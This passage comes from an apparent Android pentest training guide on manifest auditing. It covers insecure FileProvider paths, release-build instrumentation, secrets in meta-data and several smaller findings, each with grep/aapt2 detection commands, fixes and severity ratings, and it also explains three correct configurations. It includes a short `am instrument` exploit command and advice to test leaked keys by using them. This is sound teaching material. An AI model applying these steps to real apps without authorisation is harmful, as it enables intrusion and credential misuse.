referenced XML, which you must open. See
[`file_paths_insecure.xml`](file_paths_insecure.xml) versus
[`file_paths_secure.xml`](file_paths_secure.xml). A `<root-path name="root" path="/"/>` entry exposes
the entire filesystem the app can read.

`FileProvider` is designed to be `exported="false"` with `grantUriPermissions="true"`: access comes
exclusively from per-URI grants attached to an `Intent`, never from the component being exported.

**Fix.**

```xml
<provider android:name="androidx.core.content.FileProvider"
    android:authorities="${applicationId}.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
               android:resource="@xml/file_paths_secure" />
</provider>
```

**Severity: High** once you demonstrate reading a file you should not be able to read.

---

## 34. `<instrumentation>` — below `</application>`, where nobody looks

```xml
</application>

<instrumentation android:name="androidx.test.runner.AndroidJUnitRunner"
                 android:targetPackage="com.example.vulnerable" … />
```

**Why developers write it.** They do not — the test manifest was merged into the release variant.
`<instrumentation>` is a **sibling** of `<application>`, not a child, so it sits at the bottom of the
file where the auditor has already stopped reading.

**Detection.**

```bash
# host
grep -n 'instrumentation' work/AndroidManifest.xml
aapt2 dump xmltree --file AndroidManifest.xml target.apk | grep -A4 'E: instrumentation'
# host — does the runner class actually exist in the DEX?
grep -rn 'AndroidJUnitRunner' out/sources/ | head
```

**Exploit.**

```bash
# adb shell
am instrument -w com.example.vulnerable/androidx.test.runner.AndroidJUnitRunner
```

Instrumentation runs **inside the target app's process, with the target app's UID and permissions**.
If the runner class is present in the DEX, anyone with `adb` executes code in the app's sandbox. Even
when the class is absent, its presence proves a test artefact reached the shipped build.

**Fix.** Keep test runners in `src/androidTest/` so they are only merged into the test APK; add a CI
check that greps the release manifest for `instrumentation`.

**Severity: High as an indicator, potentially Critical in effect** — check whether the class exists
before you choose.

---

## 35 & 36. Secrets in `<meta-data>`

```xml
<meta-data android:name="com.example.partner.API_SECRET"
           android:value="sk_live_EXAMPLE_NOT_A_REAL_KEY_ch32" />
<meta-data android:name="com.example.vulnerable.BACKEND_TOKEN"
           android:value="eyJhbGciOiJIUzI1NiJ9…" />
```

**Why developers write it.** Structural, not careless: **the SDK's own integration guide tells them
to paste the key into the manifest.** They comply. The key then ships in every copy of the APK, in
plaintext, in a file anyone who downloads the app can read in seconds.

**Detection.**

```bash
# host
aapt2 dump xmltree --file AndroidManifest.xml target.apk | grep -A2 'E: meta-data'
grep -A2 '<meta-data' work/AndroidManifest.xml
```

**Before you report:** these are **candidates**, not findings. Validate. A Google Maps key restricted
to the package name plus SHA-1 signing digest is not exploitable, and reporting it as Critical costs
you credibility on everything else in the document. Where a key is genuinely usable, demonstrate the
usage. Where you cannot validate, say so explicitly and recommend the client verify the server-side
restriction.

**Fix.** Secrets do not belong in a client at all. Move the operation server-side and give the client
a short-lived, scoped, revocable token obtained after authentication. If a key must ship, restrict it
server-side to the package name and signing certificate, and rotate the one you just published.

**Severity: High–Critical if validated as live.** Informational if it is a public identifier.

---

## 37–39. The stragglers

**37 — `QUERY_ALL_PACKAGES` plus a `<queries>` target list.** `QUERY_ALL_PACKAGES` is Play-restricted
to specific use cases; in an app with no file-manager, launcher, antivirus or device-management
function it is both a privacy issue and a policy risk. **Low–Medium.**

The `<queries>` block is free intelligence: it lists `com.topjohnwu.magisk`,
`eu.chainfire.supersu` and `de.robv.android.xposed.installer`, which tells you the app does
package-name-based root and hooking detection — you now know exactly which checks to defeat before
reading a line of code (see [37-RootDetection](../../37-RootDetection/README.md)). It also lists two
competitor banking apps, which is a behavioural finding in its own right.

**38 — `<uses-library org.apache.http.legacy>`.** Restores the removed Apache HTTP client, which has
weaker TLS defaults and does not honour the Network Security Config the same way. Its presence means
some HTTP handling may bypass your network hardening review entirely. **Low–Medium**, and a strong
hint about where to look next.

**39 — `<permission-tree>`.** The app may add permissions at runtime via
`PackageManager.addPermission()`. The manifest therefore **does not fully describe the app's
permission surface**. **Info**, methodological: enumerate again with
`adb shell pm list permissions -f` after exercising the app.

---

## The three deliberate non-findings

Getting these *right* is what separates an experienced auditor from a checklist runner.

### Non-finding A — `AssistService` guarded by `BIND_ACCESSIBILITY_SERVICE`

```xml
<service android:name=".AssistService" android:exported="true"
         android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
```

This is the **correct** configuration. The service must be exported because the *system* binds to it,
and only the system holds `BIND_ACCESSIBILITY_SERVICE`. Reporting it as an exported-component finding
marks you as a tool operator. The same reasoning applies to `BIND_DEVICE_ADMIN`,
`BIND_NOTIFICATION_LISTENER_SERVICE`, `BIND_JOB_SERVICE`, `BIND_INPUT_METHOD`, `BIND_VPN_SERVICE`,
`BIND_WALLPAPER`, `BIND_QUICK_SETTINGS_TILE` and `BIND_AUTOFILL_SERVICE`.

**The finding would be its absence.** And there is a real finding nearby that you should report: the
referenced `@xml/accessibility_config` declares `canRetrieveWindowContent`, `canPerformGestures`,
`accessibilityEventTypes` and `packageNames`. Read it. On a malware assessment that file tells you
exactly what the service is allowed to observe and do, and it is far more informative than the
manifest entry.

### Non-finding B — `INTERNAL_IPC` at `signature`

```xml
<permission android:name="com.example.vulnerable.permission.INTERNAL_IPC"
            android:protectionLevel="signature" />
```

This is the right level for intra-vendor IPC: only apps signed with the same certificate can be
granted it, which for a third-party attacker means unreachable. Say so in the report — a report that
only lists defects is less credible than one that also recognises correct decisions. Verify the claim
with `apksigner verify --print-certs` on both APKs.

### Non-finding C — the AdMob application id

```xml
<meta-data android:name="com.google.android.gms.ads.APPLICATION_ID"
           android:value="ca-app-pub-…" />
```

Public by design. Not a secret. Reporting it as a leaked credential is the fastest way to have your
entire secrets section discounted.

---

## What the checklist could not tell you

Even a perfect audit of this file leaves gaps, and a good report says so explicitly:

| Not visible in any manifest | How you find it |
|---|---|
| Context-registered receivers (effectively exported below `targetSdk` 33) | Hook `registerReceiver` — `mf.watchReceivers()` |
| Components enabled or disabled at runtime | `adb shell dumpsys package <pkg>`; grep for `setComponentEnabledSetting` |
| Permissions added via the `<permission-tree>` | `pm list permissions -f` after exercising the app |
| What `ContentProvider.call()` exposes | Decompile the provider; [27-ContentProviders](../../27-ContentProviders/README.md) |
| `PendingIntent` mutability | Decompile; `targetSdk` 28 means it is unchecked |
| Whether a `<meta-data>` key is live | Use it |
| **Whether any exported component is genuinely attacker-reachable** | [Lab 03](../labs/lab-03-proving-reachability.md) — an unprivileged probe app, never `adb shell` |
